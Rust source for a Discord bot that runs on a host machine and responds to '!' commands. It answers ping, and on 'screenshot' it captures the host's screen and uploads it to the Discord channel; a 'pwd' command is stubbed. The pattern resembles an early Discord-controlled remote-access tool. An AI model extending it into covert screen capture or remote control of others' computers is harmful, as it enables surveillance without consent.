#![allow(non_snake_case)]

mod dowithsys;

use dowithsys::{make_screenshot};
use once_cell::unsync::Lazy;
use serde::Deserialize;
use serde_json;
use serenity::all::CreateMessage;
use serenity::async_trait;
use serenity::model::channel::Message;
use serenity::prelude::*;
use std::env::current_dir;

#[allow(dead_code)]
#[derive(Deserialize)]
struct Config {
    TOKEN: String,
}

static mut NOW_PATH: Lazy<String> = Lazy::new(|| {current_dir().unwrap().to_str().unwrap().to_string()});



struct Handler;

#[async_trait]
impl EventHandler for Handler {
    async fn message(&self, ctx: Context, msg: Message) {
        if msg.content.chars().next().unwrap() == '!' {
            let _ = match rem_first(&msg.content) {
                "ping" => msg.channel_id.say(&ctx.http, "pong!").await,
                "screenshot" => {
                    let ch = make_screenshot().await;
                    msg.channel_id
                        .send_message(&ctx.http, CreateMessage::new().add_file(ch))
                        .await
                }
                "pwd" => {
                    todo!();
                }


                _ => todo!(),
            };
        }
    }
}

#[tokio::main]
async fn main() {
    let token = config_reader().TOKEN;

    let intents = GatewayIntents::GUILD_MESSAGES
        | GatewayIntents::DIRECT_MESSAGES
        | GatewayIntents::MESSAGE_CONTENT;

    let mut client = Client::builder(&token, intents)
        .event_handler(Handler)
        .await
        .unwrap();

    // Start listening for events by starting a single shard
    if let Err(why) = client.start().await {
        println!("Error client started: {why:?}");
    }
}

#[allow(dead_code)]
fn config_reader() -> Config {
    let res = include_str!("config.json");
    let des: Config = serde_json::from_str(res).unwrap();
    return des;
}

fn rem_first(value: &str) -> &str {
    let mut chars = value.chars();
    chars.next();
    chars.as_str()
}
